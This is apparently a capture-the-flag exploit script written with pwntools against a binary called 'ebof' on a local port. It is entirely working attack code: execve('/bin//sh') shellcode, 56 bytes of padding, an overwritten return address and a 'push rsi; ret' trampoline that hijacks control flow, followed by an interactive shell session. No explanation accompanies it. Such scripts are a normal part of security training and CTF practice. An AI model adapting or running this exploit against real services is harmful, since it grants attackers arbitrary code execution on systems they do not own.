from pwn import *

context.terminal = ['terminator', '-e']
context.arch = 'amd64'
p = remote("localhost", 1024)
#p = process("src/ebof")
#gdb.attach(p, '''
#b *here_cause_you_need_it_probably+4
#''')

padding = 56

payload = asm("""
add sp, 60
xor rax, rax
push rax
mov rsi, rsp
mov rdx, rsp
mov r9, 0x68732f2f6e69622f
push r9
mov rdi, rsp
mov al, 59
syscall
""")
payload += b'A'*(padding-len(payload))
payload += p64(0x0000000000401154) + asm('push rsi\nret')
p.recvline()
p.sendline(payload)
p.interactive()